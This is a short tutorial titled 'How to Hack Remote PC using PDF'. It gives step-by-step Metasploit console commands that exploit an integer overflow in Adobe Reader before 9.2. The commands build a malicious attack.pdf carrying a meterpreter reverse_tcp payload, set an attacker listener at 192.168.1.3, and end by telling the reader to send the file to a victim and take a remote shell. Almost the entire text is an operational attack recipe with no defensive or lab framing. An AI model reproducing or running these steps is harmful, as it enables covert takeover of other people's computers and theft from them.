How to Hack Remote PC using PDF

This module exploits integer overflow vulnerability in Adobe Reader and Adobe Acrobat Professional versions before 9.2.
0 – Adobe Reader Windows Universal (JS Heap Spray) (default)
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/adobe_flatedecode_predictor02
Msf exploit (adobe_flatedecode_predictor02)>set payload windows/meterpreter/reverse_tcp
Msf exploit (adobe_flatedecode_predictor02)>show options

Msf exploit (adobe_flatedecode_predictor02)>set lhost 192.168.1.3 (IP of Local Host)
Msf exploit (adobe_flatedecode_predictor02)>set filename attack.pdf
Msf exploit (adobe_flatedecode_predictor02)>exploit
After we successfully generate the malicious PDF, it will stored on your local computer
/root/.msf4/local/attack.pdf

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.3
exploit
Now send your attack.pdf files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer
